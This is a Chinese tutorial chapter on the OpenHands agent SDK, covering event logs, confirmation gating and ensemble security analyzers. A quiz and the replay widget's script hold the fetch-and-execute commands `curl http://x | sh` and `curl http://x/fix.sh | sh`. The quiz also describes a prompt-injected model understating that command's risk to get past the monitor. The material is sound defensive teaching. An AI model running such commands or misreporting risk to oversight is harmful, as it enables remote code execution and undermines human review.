+<p><strong>源码</strong>：<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/workspace/workspace.py#L12" target="_blank" rel="noopener">workspace/workspace.py:12</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/impl/remote_conversation.py#L360" target="_blank" rel="noopener">remote_conversation.py:360</a>、<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/conversation_state.py#L18" target="_blank" rel="noopener">event/conversation_state.py:18</a>。</p>
+<p><strong>为什么这样设计</strong>：同样的 agent 代码，开发时在本机跑，上线后放进沙箱，不用改一行。这和第 12 章讲的 Managed Agents"大脑与双手分离"是同一个方向：agent 逻辑（大脑）和执行环境（双手）通过稳定接口相连，事件日志（会话）是它们共同的记忆。</p>
+
+<div class="callout note"><b>CodeAct：用代码作为动作</b>
+<p>OpenHands 早期最出名的思路来自论文《Executable Code Actions Elicit Better LLM Agents》（Wang 等，2024-02）：与其让模型从一堆预定义 JSON 工具里选，不如让它直接写可执行的代码。论文在 17 个模型上测试，报告 CodeAct 比常见做法的成功率最多高 20%。在研读版本里，默认 agent 的名字仍是 <code>CodeActAgent</code>（<a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/settings/model.py#L1499" target="_blank" rel="noopener">settings/model.py:1499</a>），终端工具就是"代码动作"的载体。下一章的 mini-swe-agent 把这个思路推到了极致：只留一个 bash。</p></div>
+
+<h2>6 · 交互：事件流回放器</h2>
+<p>逐条追加事件，右边是<strong>只根据左边的日志</strong>推导出来的状态。走到需要确认的地方，你来决定批准还是拒绝。最后试试"模拟崩溃并从磁盘恢复"，看推导结果是不是完全一样。</p>
+<div class="widget" id="replay">
+  <div class="w-title">事件流回放器</div>
+  <div class="replay">
+    <div><div style="font-size:12.5px;color:var(--muted);margin-bottom:6px">events/（只追加）</div><div class="log" data-log></div></div>
+    <dl class="derived" data-derived></dl>
+  </div>
+  <div class="btns" data-btns></div>
+  <div class="w-out" data-note></div>
+</div>
+
+<h2>7 · 值得借鉴 / 不宜照搬</h2>
+<table>
+<tr><th>值得借鉴</th><th>不宜照搬</th></tr>
+<tr><td>不可变事件 + 只追加日志作为 agent 执行层的事实来源；消息、界面、待处理动作都是投影。</td><td>整套事件溯源基础设施（文件锁、长度标记、分支树、向后兼容的事件迁移）对小项目太重。先用 SQLite 一张事件表就能拿到 80% 的好处。</td></tr>
+<tr><td>"待确认 = 有动作没观察"的推导方式，崩溃恢复天然正确。</td><td>业务层的审批对象（要列表、筛选、过期、撤回）仍然适合显式状态机，不必硬塞进事件推导。</td></tr>
+<tr><td>风险评估的纵深防御：模型自报只是一票，确定性规则独立判断，取最坏值，失败即收紧。</td><td>shell 语义分析（tree-sitter 解析）实现成本高，只有当 agent 真的执行任意命令时才值得做。</td></tr>
+<tr><td>卡死检测与"重复报错先提醒一次"的温和干预。</td><td>阈值是针对编码任务调出来的，换了场景要用自己的评测重新校准。</td></tr>
+<tr><td>压缩写成墓碑事件，原始历史永远可查。</td><td>"前一半换成摘要"的策略适合长编码会话；短对话型 agent 未必需要。</td></tr>
+</table>
+
+<h2>8 · 对照复盘</h2>
+<p>把 OpenHands 的设计和复盘里的几条发现放在一起看：</p>
+<ul>
+  <li><a href="review.html#f-D12">D12 · 轮询、内存状态、通知至多送达一次</a>：devtask 用 5 秒轮询感知变化，"忙碌"状态只在内存里。OpenHands 的远程会话用 WebSocket 推送事件和状态更新，所有执行状态都能从磁盘上的事件日志重建。</li>
+  <li><a href="review.html#f-D6">D6 · 驾驭交互式终端，没用程序化协议</a>：devtask 靠读屏幕和内部文件判断编码 agent 的状态。OpenHands 的事件本身就是结构化的"轮次结束、权限请求、观察结果"。它的前端 Agent Canvas 接入第三方 agent 时走的是 ACP。</li>
+  <li><a href="review.html#f-D5">D5 · "完成"由模型用自由文本宣布</a>：OpenHands 的完成是一个类型化的 FinishAction，执行状态是枚举，Stop hook 还能否决"完成"。</li>
+  <li><a href="review.html#f-N7">N7 · 主管线没有提示注入威胁模型</a>：niuma 的 auto 模式依赖模型自报的置信度。OpenHands 同样会让模型自报风险，但只把它当作纵深防御中的一票。</li>
+</ul>
+
+<h2>9 · 读码练习</h2>
+<details><summary>1. 一个 Action 的 <code>action</code> 字段为 None 时，会被 <code>get_unmatched_actions()</code> 当作待处理吗？为什么要这样设计？</summary>
+<p>不会。条件里要求 <code>event.action is not None</code>，注释写着"Only executable actions (validated) are considered pending"。参数校验失败的工具调用没有可执行的 action，不应该被"批准后执行"。去看 <a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/state.py#L890" target="_blank" rel="noopener">conversation/state.py:890</a>，再对照 <code>AgentErrorEvent</code> 的 <code>validation_errors</code> 字段（observation.py:146 起），想想校验失败的调用是怎么回灌给模型的。</p></details>
+<details><summary>2. 模型 finish 之后用户又发来一条消息，会不会丢？</summary>
+<p>不会。主循环在 <code>agent.step()</code> 之后特意<strong>不</strong>检查 FINISHED 状态，注释列了五步说明原因：并发的 <code>send_message()</code> 会等锁、把状态改回 IDLE，循环下一轮就会处理它。去看 <a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/conversation/impl/local_conversation.py#L2763" target="_blank" rel="noopener">local_conversation.py:2763</a>。这是"状态机 + 锁"处理并发输入的一个好例子。</p></details>
+<details><summary>3. <code>EnsembleSecurityAnalyzer</code> 默认怎么处理 UNKNOWN？什么场景下应该打开 <code>propagate_unknown</code>？</summary>
+<p>默认只有在所有子分析器都返回 UNKNOWN 时才得 UNKNOWN；只要有一个给出具体等级，UNKNOWN 就被忽略，取最高的具体等级。打开 <code>propagate_unknown</code> 后，任何一个 UNKNOWN 都会让整体变成 UNKNOWN，进而触发确认（<code>ConfirmRisky</code> 默认确认 UNKNOWN）。适合更严格的环境，比如能访问生产凭据的 agent。去看 <a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/security/ensemble.py#L22" target="_blank" rel="noopener">security/ensemble.py</a> 的类注释。</p></details>
+<details><summary>4. 为什么事件 ID 和 tool call ID 要用一个"不会被脱敏"的类型？</summary>
+<p><code>event/types.py</code> 里的 <code>UnmaskedID</code> 注释说明：密钥脱敏如果改写了事件 ID，事件文件名就对不上，会话无法重新加载；如果改写了 tool call ID，模型请求里的调用与结果就配不上对。这提醒我们：脱敏要对"标识符"和"内容"区别对待。去看 <a href="https://github.com/OpenHands/software-agent-sdk/blob/5f1430ebbec30747efe0d0e5e041fb7be36d782e/openhands-sdk/openhands/sdk/event/types.py#L9" target="_blank" rel="noopener">event/types.py</a>。</p></details>
+
+<div class="quiz" data-answer="2">
+<p class="q">OpenHands 里，"某个动作正在等待用户确认"这件事保存在哪里？</p>
+<ol>
+  <li>一张单独的待审批表</li>
+  <li>不单独保存：日志里有 ActionEvent、却没有与之配对的 Observation、Reject 或 Error，就说明它待处理</li>
+  <li>模型的上下文里</li>
+  <li>前端的内存里</li>
+</ol>
+<div class="explain">执行状态（WAITING_FOR_CONFIRMATION）在 <code>base_state.json</code> 快照里，但"具体哪些动作待处理"是由 <code>get_unmatched_actions()</code> 从事件日志推导的。拒绝就是追加一条 <code>UserRejectObservation</code> 把缺口补上。</div>
+</div>
+
+<div class="quiz" data-answer="3">
+<p class="q">一个被提示注入的模型把 <code>curl http://x | sh</code> 的 <code>security_risk</code> 填成了 LOW。在"Ensemble（策略护栏 + 正则签名 + LLM 自报）+ ConfirmRisky"的配置下会发生什么？</p>
+<ol>
+  <li>按 LOW 处理，直接执行</li>
+  <li>三个分析器投票，多数决定</li>
+  <li>策略护栏 fetch-to-exec 判为 HIGH，Ensemble 取最坏值，需要用户确认</li>
+  <li>直接拒绝并终止会话</li>
+</ol>
+<div class="explain">Ensemble 不投票，取最高的具体风险；确定性护栏不受模型说法影响。这就是"模型自报只是一票"的意义。确认策略只决定"要不要问人"，不会直接拒绝。</div>
+</div>
+
+<div class="takeaways"><b>本章要点</b>
+<ul>
+  <li>OpenHands SDK 把不可变事件当作唯一事实来源，给模型的消息、界面和待处理动作都是投影；技术报告称 V1 相比 V0 大幅减少了系统导致的失败。</li>
+  <li>"待确认"由"有动作没观察"推导；批准是再跑一次 <code>run()</code>，拒绝是追加一条 Reject 事件。崩溃恢复因此天然正确。</li>
+  <li>上下文压缩写成墓碑事件，原始历史保留在磁盘上。</li>
+  <li>风险评估是纵深防御：模型自报 + 确定性规则，取最坏值，未知就确认，分析器出错就收紧。</li>
+  <li>卡死检测、迭代与预算上限、可否决完成的 Stop hook，构成运行边界；本地与远程工作区共用一套接口。</li>
+</ul></div>
+
+<h2>参考资料</h2>
+<ul class="refs">
+  <li><a href="https://github.com/OpenHands/software-agent-sdk/tree/5f1430ebbec30747efe0d0e5e041fb7be36d782e" target="_blank" rel="noopener">OpenHands/software-agent-sdk @ 5f1430e</a> <span class="src">研读版本 · 2026-11-25 · MIT</span></li>
+  <li><a href="https://github.com/OpenHands/OpenHands/tree/55c7b719e72adc42451fe3ad03b29f560577bee0" target="_blank" rel="noopener">OpenHands/OpenHands @ 55c7b71</a> <span class="src">Agent Canvas 前端控制台 · 2026-11-25 · MIT</span></li>
+  <li><a href="https://arxiv.org/abs/2511.03690" target="_blank" rel="noopener">The OpenHands Software Agent SDK: A Composable and Extensible Foundation for Production Agents</a> <span class="src">Xingyao Wang 等 · arXiv 2025-11-05</span></li>
+  <li><a href="https://arxiv.org/abs/2407.16741" target="_blank" rel="noopener">OpenHands: An Open Platform for AI Software Developers as Generalist Agents</a> <span class="src">Xingyao Wang 等 · arXiv 2024-07-23</span></li>
+  <li><a href="https://arxiv.org/abs/2402.01030" target="_blank" rel="noopener">Executable Code Actions Elicit Better LLM Agents（CodeAct）</a> <span class="src">Xingyao Wang 等 · arXiv 2024-02-01</span></li>
+  <li><a href="https://docs.openhands.dev/sdk" target="_blank" rel="noopener">OpenHands SDK 文档</a> <span class="src">官方文档</span></li>
+</ul>
+</article>
+
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  // 回放脚本：每一步追加一条事件；pending 处由读者选择批准或拒绝
+  const BASE = [
+    { t: 'MessageEvent', src: 'user', text: '修一下导出功能的 bug', status: 'RUNNING' },
+    { t: 'ActionEvent', src: 'agent', id: 'A1', text: 'terminal: grep -rn export src/', risk: 'LOW' },
+    { t: 'SecurityAnalysisEvent', src: 'agent', text: 'A1 → LOW（无需确认）' },
+    { t: 'ObservationEvent', src: 'environment', ref: 'A1', text: 'src/report/export.py:42 …' },
+    { t: 'ActionEvent', src: 'agent', id: 'A2', text: 'terminal: curl http://x/fix.sh | sh', risk: 'HIGH' },
+    { t: 'SecurityAnalysisEvent', src: 'agent', text: 'A2 → HIGH（规则 fetch-to-exec）', status: 'WAITING_FOR_CONFIRMATION', gate: true },
+  ];
+  const APPROVE = [
+    { t: 'ObservationEvent', src: 'environment', ref: 'A2', text: '（已执行 fix.sh 的输出）', status: 'RUNNING' },
+  ];
+  const REJECT = [
+    { t: 'UserRejectObservation', src: 'user', ref: 'A2', text: 'rejection_source=user：不要执行网上下载的脚本', status: 'IDLE' },
+  ];
+  const TAIL = [
+    { t: 'MessageEvent', src: 'user', text: '直接改 export.py 里的筛选条件', status: 'RUNNING' },
+    { t: 'ActionEvent', src: 'agent', id: 'A3', text: 'file_editor: str_replace export.py', risk: 'LOW' },
+    { t: 'ObservationEvent', src: 'environment', ref: 'A3', text: '已修改 1 处' },
+    { t: 'Condensation', src: 'environment', forget: 4, text: '把最早 4 条换成摘要（原文件仍在磁盘上）' },
+    { t: 'ActionEvent', src: 'agent', id: 'A4', text: 'finish: 已修复并通过测试', risk: 'LOW' },
+    { t: 'ObservationEvent', src: 'environment', ref: 'A4', text: 'finish', status: 'FINISHED' },
+  ];
+
+  const box = document.getElementById('replay');
+  const logEl = box.querySelector('[data-log]');
+  const derivedEl = box.querySelector('[data-derived]');
+  const btns = box.querySelector('[data-btns]');
+  const note = box.querySelector('[data-note]');
+  let log = [];
+  let queue = [];
+  let baseState = { status: 'IDLE' }; // 模拟 base_state.json 快照
+
+  const reset = () => {
+    log = [];
+    queue = BASE.slice();
+    baseState = { status: 'IDLE' };
+    note.textContent = '点"追加下一条事件"开始。';
+    render(-1);
+  };
+
+  // 只依赖日志本身推导：与 get_unmatched_actions() 同样的倒序配对
+  const unmatched = (events) => {
+    const seen = new Set();
+    const out = [];
+    for (let i = events.length - 1; i >= 0; i--) {
+      const e = events[i];
+      if (e.ref) seen.add(e.ref);
+      else if (e.t === 'ActionEvent' && !seen.has(e.id)) out.unshift(e);
+    }
+    return out;
+  };
+  const viewSize = (events) => {
+    let hidden = 0;
+    for (const e of events) if (e.t === 'Condensation') hidden += e.forget;
+    const convertible = events.filter((e) => e.t !== 'SecurityAnalysisEvent' && e.t !== 'Condensation').length;
+    return { hidden, visible: Math.max(0, convertible - hidden) + (hidden ? 1 : 0) };
+  };
+
+  function render(newIdx) {
+    const pend = unmatched(log);
+    const hiddenCount = log.filter((e) => e.t === 'Condensation').reduce((s, e) => s + e.forget, 0);
+    logEl.innerHTML = log
+      .map((e, i) => {
+        const cls = [i === newIdx ? 'new' : '', pend.includes(e) ? 'pending' : '', i < hiddenCount && e.t !== 'Condensation' ? 'hidden' : ''].join(' ');
+        const name = `event-${String(i).padStart(5, '0')}`;
+        return `<div class="${cls}">${name}  ${e.t}  [${e.src}]${e.id ? ' ' + e.id : ''}${e.ref ? ' ↩' + e.ref : ''}\n  ${Course.escape(e.text)}</div>`;
+      })
+      .join('') || '<div style="color:var(--muted)">（空）</div>';
+    logEl.scrollTop = logEl.scrollHeight;
+    const v = viewSize(log);
+    derivedEl.innerHTML = `
+      <dt>执行状态（base_state.json）</dt><dd>${baseState.status}</dd>
+      <dt>待处理动作（由日志推导）</dt><dd>${pend.length ? pend.map((p) => p.id + '：' + Course.escape(p.text)).join('<br>') : '无'}</dd>
+      <dt>送给模型的消息数（View 投影）</dt><dd>${v.visible} 条${v.hidden ? `（${v.hidden} 条已被墓碑事件替换为 1 条摘要）` : ''}</dd>
+      <dt>事件总数（磁盘上）</dt><dd>${log.length}</dd>`;
+    btns.innerHTML = '';
+    const add = (label, fn, primary) => {
+      const b = Course.el('button', { type: 'button', class: 'btn small' + (primary ? ' primary' : ''), text: label });
+      b.addEventListener('click', fn);
+      btns.append(b);
+    };
+    if (baseState.status === 'WAITING_FOR_CONFIRMATION') {
+      add('批准（再次 run()）', () => choose(APPROVE, '批准：下一次 run() 时，step() 先执行未配对的 A2，结果作为 Observation 追加。'), true);
+      add('拒绝（reject_pending_actions）', () => choose(REJECT, '拒绝：追加一条 UserRejectObservation，A2 从此被"配对"，不再待处理。'));
+    } else if (queue.length) {
+      add('追加下一条事件', step, true);
+    }
+    if (log.length) add('模拟崩溃并从磁盘恢复', crash);
+    add('重来', reset);
+  }
+
+  function step() {
+    const e = queue.shift();
+    log.push(e);
+    if (e.status) baseState.status = e.status;
+    note.textContent = e.gate
+      ? '规则判为 HIGH，ConfirmRisky 要求确认，run() 返回。注意左边虚线框：A2 有动作、没有观察，所以它是"待处理"。'
+      : e.t === 'Condensation'
+        ? '压缩不会删除事件，只是追加一条墓碑；View 读取时应用它。划线的事件仍在磁盘上，只是不再送给模型。'
+        : e.status === 'FINISHED'
+          ? '完成。可以试试"模拟崩溃并从磁盘恢复"。'
+          : `追加 ${e.t}（source=${e.src}）。`;
+    render(log.length - 1);
+  }
+  function choose(branch, msg) {
+    queue = branch.concat(TAIL);
+    step();
+    note.textContent = msg;
+  }
+  function crash() {
+    // 丢掉所有内存中的推导结果，只保留"磁盘"上的事件与快照，再重新推导
+    const disk = JSON.parse(JSON.stringify(log));
+    const snap = JSON.parse(JSON.stringify(baseState));
+    log = [];
+    render(-1);
+    note.textContent = '进程已崩溃，内存清空……';
+    setTimeout(() => {
+      log = disk;
+      baseState = snap;
+      render(-1);
+      note.textContent = '已从 events/ 与 base_state.json 恢复。右侧的待处理动作和消息数都是重新推导出来的，和崩溃前完全一致。';
+    }, 700);
+  }
+  reset();
+});
+</script>
+</body>
+</html>
